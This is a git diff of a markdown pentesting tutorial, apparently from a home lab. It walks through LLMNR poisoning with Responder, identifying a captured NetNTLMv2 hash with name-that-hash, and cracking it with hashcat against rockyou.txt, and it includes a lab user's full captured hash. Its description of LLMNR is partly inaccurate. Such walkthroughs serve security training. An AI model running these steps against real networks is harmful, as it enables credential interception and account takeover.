@@ -1,7 +1,37 @@
+# LLMNR
+#### LLMNR is a key feature in Active Directory used to hail other hosts on the network if DNS fails to do so. The DC sends out a broadcast asking any connected host to respond.  Any that do confirm the response by sending a username and NTLM password hash back.  Using Responder, a MITM sniffer, we can intercept this signal and attempt to crack the hash or reuse it in a login attempt aka 'passing the hash'.  We will explore both, as well as examples of how we could use responder during an engagement.
+
+
+#### Start Responder on your eth0
+#### We can find our etho with the `ip a` command:
+![image](https://user-images.githubusercontent.com/76034874/186995673-2c0efa17-d788-4a41-b39a-6704c839518a.png)
+
+
+`responder -I eth0 -v`
+![image](https://user-images.githubusercontent.com/76034874/186995327-2bf3e6da-c1a8-448f-84b2-d92a052d132a.png)
+
+#### Simulate a user logging into their terminal for the day:
+
+
+
+#### and shortly responder intercepts a response:
+![image](https://user-images.githubusercontent.com/76034874/186996305-77a429b1-3581-4f19-bb16-8e0246bcbaf8.png)
+
+
+
+
 
 
 ### One of my favorite hash identifiers is nth (apt install name-that-hash)
-the syntax looks like this: ``` !bash
-fcastle::MARVEL:b5767a2e087ea531:157C0B6B863C13119F038A5C01F702D7:0101000000000000805C66FF6AB9D801840E548DADCD23980000000002000800300037005200490001001E00570049004E002D0048004F004E004D0041004A0035004D0031004900460004003400570049004E002D0048004F004E004D0041004A0035004D003100490046002E0030003700520049002E004C004F00430041004C000300140030003700520049002E004C004F00430041004C000500140030003700520049002E004C004F00430041004C0007000800805C66FF6AB9D801060004000200000008003000300000000000000001000000002000001C9851B85E8B1F50D2CC6B325325427C08CA439D04EBABC76FA4ACAA8FB6C5F20A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0030002E0032002E00330030000000000000000000
+the syntax looks like this: 
+``` bash
+nth -t 'fcastle::MARVEL:b5767a2e087ea531:157C0B6B863C13119F038A5C01F702D7:0101000000000000805C66FF6AB9D801840E548DADCD23980000000002000800300037005200490001001E00570049004E002D0048004F004E004D0041004A0035004D0031004900460004003400570049004E002D0048004F004E004D0041004A0035004D003100490046002E0030003700520049002E004C004F00430041004C000300140030003700520049002E004C004F00430041004C000500140030003700520049002E004C004F00430041004C0007000800805C66FF6AB9D801060004000200000008003000300000000000000001000000002000001C9851B85E8B1F50D2CC6B325325427C08CA439D04EBABC76FA4ACAA8FB6C5F20A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0030002E0032002E00330030000000000000000000'
 ```
 ![image](https://user-images.githubusercontent.com/76034874/186991763-66c543f3-e84e-4f03-9d3a-de036f2e85a7.png)
+
+
+### Now we can copy-pasta the entire hash in a file on our attack machine via `nano hash.txt`
+### using hashcat, we can see if we can crack this hash by running it against rockyou.txt for this demo.  In the real world, if this fails, we would use a more custom, bigger wordlist to make sure our weak password test is thorough and up to date.
+syntax: `hashcat -O -m 5600 hash /usr/share/wordlists/rockyou.txt`
+![image](https://user-images.githubusercontent.com/76034874/186996929-a065c526-cf10-44ad-900e-7f4d5cfa1253.png)
+
